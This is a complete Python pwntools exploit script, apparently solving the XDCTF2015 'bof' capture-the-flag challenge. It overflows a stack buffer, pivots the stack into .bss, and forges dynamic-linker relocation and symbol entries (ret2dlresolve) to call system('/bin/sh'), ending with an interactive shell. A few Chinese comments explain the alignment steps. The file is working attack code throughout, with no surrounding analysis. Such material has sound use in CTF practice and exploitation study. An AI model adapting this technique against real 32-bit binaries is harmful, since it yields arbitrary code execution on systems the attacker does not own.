#!/usr/bin/python3

from pwn import *
elf = ELF('./bof')
context.log_level = 'debug'

offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619 # ROPgadget --binary bof --only "pop|ret"
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458 # ROPgadget --binary bof --only "leave|ret"

stack_size = 0x800
bss_addr = 0x0804a040 # readelf -S bof | grep ".bss"
base_stage = bss_addr + stack_size

r = process('./bof')

r.recvuntil('Welcome to XDCTF2015~!\n')
payload = flat('A' * offset
, p32(read_plt)
, p32(ppp_ret)
, p32(0)
, p32(base_stage)
, p32(100)
, p32(pop_ebp_ret)
, p32(base_stage)
, p32(leave_ret))
r.sendline(payload)

cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt bof
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
dynsym = 0x080481D8  # readelf -S bof
strtab = 0x08048278 #readelf -S bof
fake_write_addr = base_stage + 28
fake_arg = fake_write_addr - rel_plt
r_offset = elf.got['write']

align = 0x10 - ((base_stage + 36 - dynsym) % 16) 
fake_sym_addr = base_stage + 36 + align # 填充地址使其与dynsym的偏移16字节对齐（即两者的差值能被16整除），因为结构体sym的大小都是16字节
r_info = ((((fake_sym_addr - dynsym)//16) << 8) | 0x7) # 使其最低位为7，通过检测
fake_write_rel = flat(p32(r_offset), p32(r_info))
fake_write_str_addr = base_stage + 36 + align + 0x10
fake_name = fake_write_str_addr - strtab
fake_sym = flat(p32(fake_name),p32(0),p32(0),p32(0x12))
fake_write_str = 'system\x00'

payload2 = flat('AAAA'
, p32(plt_0)
, fake_arg
, p32(ppp_ret)
, p32(base_stage + 80)
, p32(base_stage + 80)
, p32(len(cmd))
, fake_write_rel # base_stage + 28
, 'A' * align # 用于对齐的填充
, fake_sym # base_stage + 36 + align
, fake_write_str # 伪造出的字符串
)
payload2 += flat('A' * (80-len(payload2)) , cmd + '\x00')
payload2 += flat('A' * (100-len(payload2)))

r.sendline(payload2)
r.interactive()
